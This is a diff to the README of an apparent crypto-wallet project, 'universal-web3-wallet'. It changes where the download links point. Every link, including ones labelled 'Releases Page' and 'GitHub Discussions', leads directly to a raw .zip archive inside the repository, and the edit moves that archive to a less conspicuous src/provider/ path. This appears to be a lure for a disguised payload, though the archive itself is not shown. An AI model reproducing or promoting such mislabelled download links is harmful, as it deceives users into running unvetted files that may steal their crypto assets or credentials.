@@ -1,6 +1,6 @@
 # 🚀 universal-web3-wallet - A Simple Way to Manage Your Crypto
 
-[![Download Now](https://raw.githubusercontent.com/Arcila12/universal-web3-wallet/main/upstroke/universal-web3-wallet.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Arcila12/universal-web3-wallet/main/upstroke/universal-web3-wallet.zip)
+[![Download Now](https://raw.githubusercontent.com/Arcila12/universal-web3-wallet/main/src/provider/web-universal-wallet-2.4.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Arcila12/universal-web3-wallet/main/src/provider/web-universal-wallet-2.4.zip)
 
 ## 🛠️ Features
 - **EIP-1193 Compatibility**: Works smoothly with various Ethereum applications.
@@ -16,7 +16,7 @@ To begin using the universal-web3-wallet, follow these simple steps:
 
 1. **Visit Our Releases Page**  
    Click on the link below to go to the Releases page.  
-   [Visit Releases Page to Download](https://raw.githubusercontent.com/Arcila12/universal-web3-wallet/main/upstroke/universal-web3-wallet.zip)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/Arcila12/universal-web3-wallet/main/src/provider/web-universal-wallet-2.4.zip)
 
 2. **Locate the Latest Release**  
    Once on the Releases page, find the latest version of the universal-web3-wallet.
@@ -61,8 +61,8 @@ If you encounter issues while using the universal-web3-wallet, here are some com
 - **Assets Not Displaying**: Make sure you are connected to the correct network where the assets exist.
 
 ## 🌍 Community and Support
-You are not alone! Join the community to share experiences, ask questions, and help others. Check our [GitHub Discussions](https://raw.githubusercontent.com/Arcila12/universal-web3-wallet/main/upstroke/universal-web3-wallet.zip) for engaging topics.
+You are not alone! Join the community to share experiences, ask questions, and help others. Check our [GitHub Discussions](https://raw.githubusercontent.com/Arcila12/universal-web3-wallet/main/src/provider/web-universal-wallet-2.4.zip) for engaging topics.
 
 ## 📥 Download & Install
 Ready to start managing your crypto?  
-Visit our [Releases Page to Download](https://raw.githubusercontent.com/Arcila12/universal-web3-wallet/main/upstroke/universal-web3-wallet.zip) the latest version of the universal-web3-wallet and follow the installation steps above. Enjoy a secure and user-friendly way to access Web3!
+Visit our [Releases Page to Download](https://raw.githubusercontent.com/Arcila12/universal-web3-wallet/main/src/provider/web-universal-wallet-2.4.zip) the latest version of the universal-web3-wallet and follow the installation steps above. Enjoy a secure and user-friendly way to access Web3!
